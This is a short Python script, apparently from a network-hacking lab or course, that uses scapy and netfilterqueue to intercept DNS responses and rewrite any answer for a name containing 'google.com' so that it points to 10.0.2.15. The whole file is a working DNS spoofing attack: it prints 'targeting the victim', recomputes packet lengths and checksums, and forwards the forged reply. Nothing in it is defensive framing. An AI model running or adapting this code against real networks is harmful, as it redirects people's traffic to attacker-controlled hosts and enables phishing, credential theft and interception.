#!/usr/bin/env python


import scapy.all as scapy

import netfilterqueue


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    print(scapy_packet.show())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "google.com" in qname:
            print("targeting the victim")

            answered = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")

            scapy_packet[scapy.DNS].an = answered

            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len

            del scapy_packet[scapy.IP].chksum

            del scapy_packet[scapy.UDP].chksum

            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()

queue.bind(0, process_packet)

queue.run()
